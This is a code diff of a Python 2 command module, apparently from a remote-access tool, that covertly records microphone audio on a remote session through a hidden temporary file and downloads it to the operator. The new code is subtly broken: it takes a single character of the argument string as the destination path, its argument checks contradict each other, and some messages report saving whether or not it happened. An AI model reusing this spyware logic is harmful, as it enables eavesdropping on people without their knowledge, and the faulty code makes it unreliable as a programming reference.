@@ -27,26 +27,66 @@ class command:
     def __init__(self):
         self.name = "mic"
         self.description = "Record mic sound."
+        self.usage = "Usage: mic [start|stop <local_path>]"
         
     def run(self,session,cmd_data):
-        # #print output        
-        if cmd_data["args"] == "stop":
-            # expect json
-            result = json.loads(session.send_command(cmd_data))
-            if 'error' in result:
-                h.info_error("Error: " + result['error'])
-            elif 'status' in result and result['status'] == 1:
-                # download file
-                data = session.download_file("/tmp/.avatmp")
-                # save to file
-                file_name = "mic{0}.caf".format(str(int(time.time())))
-                h.info_general("Saving {0}".format(file_name))
-                f = open(os.path.join('downloads',file_name),'w')
-                f.write(data)
-                f.close()
-                h.info_success("Saved to downloads/{0}!".format(file_name))
-            
-        elif cmd_data["args"] == "start":
-            h.info_general(session.send_command(cmd_data))
+        if not cmd_data['args']:
+            print self.usage
         else:
-            print "Usage: mic [start|stop]"
+            if cmd_data['args'].split()[0] == "start":
+                pass
+            else:
+                if len(cmd_data['args'].split()) < 2 or cmd_data['args'].split()[0] != "stop":
+                    print self.usage
+            	    return
+		
+        if cmd_data['args'] == "stop":
+	    dest = cmd_data['args'][1]
+            if os.path.isdir(dest):
+                if os.path.exists(dest):
+		    h.info_general("Recording mic...")
+                    result = json.loads(session.send_command(cmd_data))
+                    if 'error' in result:
+                        h.info_error("Failed to record mic!")
+			return
+                    elif 'status' in result and result['status'] == 1:
+                        data = session.download_file("/tmp/.avatmp")
+                        f = open(os.path.join(dest,'mic.caf'),'w')
+                        f.write(data)
+                        f.close()
+                    if dest[-1:] == "/":
+                        h.info_general("Saving to "+dest+"mic.caf...")
+                        time.sleep(1)
+                        h.info_success("Saved to "+dest+"mic.caf!")
+                    else:
+                        h.info_general("Saving to "+dest+"/mic.caf...")
+                        time.sleep(1)
+                        h.info_success("Saved to "+dest+"/mic.caf!")
+                else:
+                    h.info_error("Local directory: "+dest+": does not exist!")
+            else:
+                rp = os.path.split(dest)[0]
+                if os.path.exists(rp):
+		    if os.path.isdir(rp):
+			pr = os.path.split(dest)[0]
+                        rp = os.path.split(dest)[1]
+                        result = json.loads(session.send_command(cmd_data))
+                        if 'error' in result:
+                            h.info_error("Failed to record mic!")
+			    return
+                        elif 'status' in result and result['status'] == 1:
+                            data = session.download_file("/tmp/.avatmp")
+                            f = open(os.path.join(pr,rp),'w')
+                            f.write(data)
+                            f.close()
+                        h.info_general("Saving to "+dest+"...")
+                        time.sleep(1)
+                        h.info_success("Saved to "+dest+"!")
+                    else:
+                        h.info_error("Error: "+rp+": not a directory!")
+                else:
+                    h.info_error("Local directory: "+rp+": does not exist!")
+        
+        elif cmd_data['args'].split()[0] == "start":
+            h.info_general("Recording mic...")
+            h.info_general(session.send_command(cmd_data))
